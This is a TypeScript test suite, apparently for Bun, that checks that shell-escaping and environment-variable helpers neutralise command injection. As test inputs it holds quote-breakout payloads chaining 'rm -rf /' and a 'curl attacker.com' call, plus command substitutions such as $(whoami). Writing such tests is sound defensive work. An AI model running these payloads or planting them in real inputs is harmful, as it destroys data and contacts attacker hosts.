/**
 * Security Tests - Shell Escaping and Injection Prevention
 *
 * These tests verify that the shell escaping utilities properly prevent
 * command injection attacks when constructing shell commands.
 */

import { describe, it, expect } from 'bun:test';
import {
  escapeShellArg,
  quoteShellArg,
  escapeShellPath,
  isValidEnvVarName,
  buildEnvAssignment,
} from '../../src/utils/shell';

describe('Shell Escaping Security', () => {
  describe('escapeShellArg', () => {
    it('escapes single quotes', () => {
      expect(escapeShellArg("it's")).toBe("it'\\''s");
    });

    it('handles multiple single quotes', () => {
      expect(escapeShellArg("a'b'c")).toBe("a'\\''b'\\''c");
    });

    it('passes through safe strings unchanged', () => {
      expect(escapeShellArg('safe-string')).toBe('safe-string');
      expect(escapeShellArg('hello_world')).toBe('hello_world');
      expect(escapeShellArg('http://localhost:8080')).toBe('http://localhost:8080');
    });

    it('handles empty string', () => {
      expect(escapeShellArg('')).toBe('');
    });

    it('prevents command injection via single quote breakout', () => {
      const malicious = "url' && rm -rf / && echo '";
      const escaped = escapeShellArg(malicious);
      // The result should escape the quotes so they're literal
      expect(escaped).toBe("url'\\'' && rm -rf / && echo '\\''");
    });

    it('handles strings with only single quotes', () => {
      expect(escapeShellArg("'''")).toBe("'\\'''\\'''\\''");
    });

    it('throws on non-string input', () => {
      // @ts-expect-error Testing runtime behavior
      expect(() => escapeShellArg(123)).toThrow(TypeError);
      // @ts-expect-error Testing runtime behavior
      expect(() => escapeShellArg(null)).toThrow(TypeError);
      // @ts-expect-error Testing runtime behavior
      expect(() => escapeShellArg(undefined)).toThrow(TypeError);
    });
  });

  describe('quoteShellArg', () => {
    it('wraps in single quotes', () => {
      expect(quoteShellArg('test')).toBe("'test'");
    });

    it('escapes and wraps', () => {
      expect(quoteShellArg("it's")).toBe("'it'\\''s'");
    });

    it('handles empty string', () => {
      expect(quoteShellArg('')).toBe("''");
    });

    it('handles strings with spaces', () => {
      expect(quoteShellArg('hello world')).toBe("'hello world'");
    });

    it('handles special shell characters safely', () => {
      expect(quoteShellArg('$HOME')).toBe("'$HOME'");
      expect(quoteShellArg('`whoami`')).toBe("'`whoami`'");
      expect(quoteShellArg('$(id)')).toBe("'$(id)'");
    });
  });

  describe('escapeShellPath', () => {
    it('escapes paths with spaces', () => {
      expect(escapeShellPath('/path/with spaces/file')).toBe("'/path/with spaces/file'");
    });

    it('escapes paths with special characters', () => {
      expect(escapeShellPath("/path/it's/mine")).toBe("'/path/it'\\''s/mine'");
    });

    it('handles normal paths', () => {
      expect(escapeShellPath('/usr/local/bin')).toBe("'/usr/local/bin'");
    });
  });

  describe('isValidEnvVarName', () => {
    it('accepts valid names', () => {
      expect(isValidEnvVarName('CHROMA_URL')).toBe(true);
      expect(isValidEnvVarName('_PRIVATE')).toBe(true);
      expect(isValidEnvVarName('var1')).toBe(true);
      expect(isValidEnvVarName('MY_VAR_123')).toBe(true);
      expect(isValidEnvVarName('a')).toBe(true);
      expect(isValidEnvVarName('_')).toBe(true);
    });

    it('rejects names starting with numbers', () => {
      expect(isValidEnvVarName('1VAR')).toBe(false);
      expect(isValidEnvVarName('123')).toBe(false);
    });

    it('rejects names with hyphens', () => {
      expect(isValidEnvVarName('VAR-NAME')).toBe(false);
      expect(isValidEnvVarName('my-var')).toBe(false);
    });

    it('rejects names with spaces', () => {
      expect(isValidEnvVarName('VAR NAME')).toBe(false);
      expect(isValidEnvVarName(' VAR')).toBe(false);
    });

    it('rejects names with special characters', () => {
      expect(isValidEnvVarName('VAR=value')).toBe(false);
      expect(isValidEnvVarName('$(cmd)')).toBe(false);
      expect(isValidEnvVarName('VAR;rm')).toBe(false);
      expect(isValidEnvVarName("VAR'")).toBe(false);
    });

    it('rejects empty string', () => {
      expect(isValidEnvVarName('')).toBe(false);
    });
  });

  describe('buildEnvAssignment', () => {
    it('builds safe assignment for simple values', () => {
      expect(buildEnvAssignment('MY_VAR', 'value')).toBe("MY_VAR='value'");
    });

    it('builds safe assignment for URLs', () => {
      expect(buildEnvAssignment('URL', 'http://localhost:8080')).toBe(
        "URL='http://localhost:8080'"
      );
    });

    it('escapes malicious values with quote breakout', () => {
      const result = buildEnvAssignment('URL', "http://x' && rm -rf / && echo '");
      // Should contain escaped quotes
      expect(result).toContain("URL='http://x'\\''");
      // The && should be inside quotes, not executable
      expect(result).toBe("URL='http://x'\\'' && rm -rf / && echo '\\'''");
    });

    it('escapes values with command substitution', () => {
      const result = buildEnvAssignment('VAR', '$(whoami)');
      expect(result).toBe("VAR='$(whoami)'");
    });

    it('escapes values with backticks', () => {
      const result = buildEnvAssignment('VAR', '`id`');
      expect(result).toBe("VAR='`id`'");
    });

    it('throws on invalid var name', () => {
      expect(() => buildEnvAssignment('INVALID-NAME', 'val')).toThrow(
        'Invalid environment variable name: INVALID-NAME'
      );
    });

    it('throws on var name with injection attempt', () => {
      expect(() => buildEnvAssignment('VAR;rm -rf /', 'val')).toThrow();
      expect(() => buildEnvAssignment("VAR'", 'val')).toThrow();
    });

    it('handles empty values', () => {
      expect(buildEnvAssignment('EMPTY', '')).toBe("EMPTY=''");
    });

    it('handles values with newlines', () => {
      const result = buildEnvAssignment('MULTI', 'line1\nline2');
      expect(result).toBe("MULTI='line1\nline2'");
    });
  });

  describe('Integration: Command Construction Safety', () => {
    it('constructs safe env prefix for shell command', () => {
      const envVars: string[] = [];
      envVars.push(buildEnvAssignment('SAFE_VAR', 'safe_value'));
      envVars.push(buildEnvAssignment('URL', 'http://localhost'));
      const envPrefix = envVars.join(' ') + ' ';

      expect(envPrefix).toBe("SAFE_VAR='safe_value' URL='http://localhost' ");
    });

    it('safely handles malicious env values in command', () => {
      const maliciousUrl = "http://x' && curl attacker.com && echo '";
      const envVars: string[] = [];
      envVars.push(buildEnvAssignment('URL', maliciousUrl));
      const envPrefix = envVars.join(' ') + ' ';

      // The command should be safe - && should not be executable
      const cmd = `${envPrefix}bun run script.ts`;

      // Verify the malicious payload is escaped - the single quote should be escaped
      // so it doesn't break out of the quoted value
      expect(cmd).toContain("'\\''"); // escaped quote present
      // The URL value should start with proper quoting
      expect(cmd).toMatch(/URL='http:\/\/x'\\''/);
    });

    it('safely handles path with injection in cd command', () => {
      const maliciousPath = "/tmp' && rm -rf / && echo '";
      const safePath = escapeShellPath(maliciousPath);
      const cmd = `cd ${safePath} && bun run script.ts`;

      // The path should be quoted and escaped
      expect(safePath).toBe("'/tmp'\\'' && rm -rf / && echo '\\'''");
      // The full command should have the path properly escaped
      expect(cmd).toContain("'/tmp'\\''");
    });
  });
});
